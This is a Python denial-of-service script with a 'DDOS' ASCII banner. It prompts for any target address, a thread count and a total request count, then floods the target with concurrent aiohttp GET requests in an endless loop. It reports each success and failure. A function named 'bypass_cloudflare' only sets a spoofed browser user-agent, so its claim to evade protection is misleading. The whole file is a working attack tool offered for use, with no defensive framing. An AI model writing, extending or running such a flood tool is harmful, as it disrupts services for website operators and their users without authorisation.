import aiohttp
import asyncio
import os
import time

auth = """
 ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
█ ▄▀   █ █ ▄▀   █ █      █ █ █   ▐ 
▐ █    █ ▐ █    █ █      █    ▀▄   
  █    █   █    █ ▀▄    ▄▀ ▀▄   █  
 ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
█     ▐  █     ▐            ▐      
▐        ▐                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
"""

async def bypass_cloudflare(target_url):
    async with aiohttp.ClientSession() as session:
        headers = {'user-agent': 'Mozilla/4.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.1245.0 Safari/537.36'}
        async with session.get(target_url, headers=headers) as response:
            return await response.text()

async def perform_ddos_attack(target_url, num_requests, num_threads):
    success_count = 0
    failure_count = 0
    lock = asyncio.Lock()

    async def worker():
        nonlocal success_count, failure_count
        for _ in range(num_requests // num_threads):
            try:
                bypassed_content = await bypass_cloudflare(target_url)
                async with lock:
                    success_count += 1
                    print(f"\033[32m[+] Request successful: {success_count}")
            except Exception as e:
                async with lock:
                    failure_count += 1
                    print(f"\033[31m[-] Failed request: {failure_count}")

    await asyncio.gather(*(worker() for _ in range(num_threads)))

while True:
    os.system("cls||clear")
    print(auth)
    target_url = input("\033[32mEnter the anyone address: \x1b[0m").strip()
    num_threads = int(input("\033[32mHow many requests should it send per second: \x1b[0m").strip())
    num_requests = int(input("\033[32mHow many requests should be made in total: \x1b[0m").strip())

    asyncio.run(perform_ddos_attack(target_url, num_requests, num_threads))
    print("\n\x1b[31mthe program is restarting. Waiting for 5 seconds...\x1b[0m")
    time.sleep(5)
